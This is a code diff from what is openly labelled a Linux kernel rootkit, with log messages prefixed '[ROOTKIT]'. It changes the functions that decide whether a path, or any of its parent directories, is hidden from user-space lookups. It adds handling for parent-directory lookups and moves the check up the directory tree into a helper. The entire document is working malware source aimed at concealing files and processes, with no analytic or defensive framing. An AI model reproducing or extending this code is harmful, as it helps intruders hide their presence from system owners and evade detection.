@@ -57,8 +57,7 @@ bool is_process_path(const path_t *const p_path, const char **const ps_name, pid
 
 bool is_path_hidden(const path_t *const p_path)
 {
-    const dentry_t *p_parent = NULL; // dentry structure for parent directories
-    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
+    pid_t i32_found_pid = -1; // PID of the process found in the path, if any
 
     IF_U (p_path == NULL) {
         return false;
@@ -80,17 +79,7 @@ bool is_path_hidden(const path_t *const p_path)
     }
 
     // If the path is not a process file/dir, check if one of its parents has a hidden name
-    p_parent = p_path->dentry->d_parent;
-    while (!IS_ROOT(p_parent)) {
-        if (is_filename_hidden(p_parent->d_name.name)) {
-            pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
-            return true;
-        }
-
-        p_parent = p_parent->d_parent;
-    }
-
-    return false;
+    return is_path_hierarchy_hidden(p_path);
 }
 
 bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
@@ -98,10 +87,16 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
 {
     bool b_ret               = false; // Return value
     int i_err                = 0;     // Error code
+    bool b_lookup_parents    = false; // Whether to only check parent directories
     const char *s_pathname_k = NULL;  // Kernel buffer for path name
     path_t path;                      // Path structure
 
     ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount
+
+    IF_U (ui32_lookup_flags & LOOKUP_PARENTS) {
+        b_lookup_parents = true;
+        ui32_lookup_flags &= ~LOOKUP_PARENTS;
+    }
 
     // First, check without following symlinks
     i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);
@@ -112,6 +107,13 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                s_pathname_k, i_err);
         kfree_const(s_pathname_k);
         return false;
+    }
+
+    IF_U (b_lookup_parents) {
+        // If we are looking for a parent directory, we need to go up the directory tree
+        path_get(&path); // Increment the path reference count while we use it
+        path.dentry = dget_parent(path.dentry);
+        path_put(&path); // Release the path structure
     }
 
     b_ret = is_path_hidden(&path);
@@ -133,6 +135,12 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                s_pathname_k, i_err);
         kfree_const(s_pathname_k);
         return false;
+    }
+
+    IF_U (b_lookup_parents) {
+        path_get(&path);
+        path.dentry = dget_parent(path.dentry);
+        path_put(&path);
     }
 
     b_ret = is_path_hidden(&path);
